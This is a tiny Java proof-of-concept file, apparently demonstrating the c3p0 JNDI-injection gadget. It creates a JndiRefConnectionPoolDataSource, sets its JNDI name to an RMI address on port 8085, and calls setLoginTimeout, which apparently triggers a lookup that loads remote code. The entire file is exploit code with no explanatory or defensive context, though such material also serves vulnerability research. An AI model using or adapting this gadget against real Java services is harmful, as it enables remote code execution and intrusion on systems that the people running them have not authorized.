package C3P0;

import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;

public class c3pjndi {
    public static void main(String[] args) throws Exception {
        JndiRefConnectionPoolDataSource exp = new JndiRefConnectionPoolDataSource();
        exp.setJndiName("rmi://127.0.0.1:8085/CBLNaQal");
        exp.setLoginTimeout(1);
    }
}
